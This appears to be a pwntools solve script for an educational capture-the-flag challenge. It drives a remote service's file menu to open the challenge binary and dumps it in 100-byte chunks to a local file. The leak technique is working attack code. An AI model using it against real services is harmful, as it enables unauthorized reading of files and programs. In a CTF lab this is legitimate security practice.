import pwn
proc = pwn.remote("edu-ctf.zoolab.org", 10001)
proc.recvuntil(b"> ")
proc.sendline(b"1")
proc.recvuntil(b"filename> ")
proc.sendline(b"/home/chal/chal")


with open("dmp", "wb") as fp:
    for i in range(300):
        print(f"cur process:{i}")
        # seek
        proc.recvuntil(b"> ")
        proc.sendline(b"5")
        proc.recvuntil(b"offset> ")
        proc.sendline(str(i * 100).encode())

        # read
        proc.recvuntil(b"> ")
        proc.sendline(b"2")

        # write
        proc.recvuntil(b"> ")
        proc.sendline(b"3")

        fp.write(proc.recv(100))

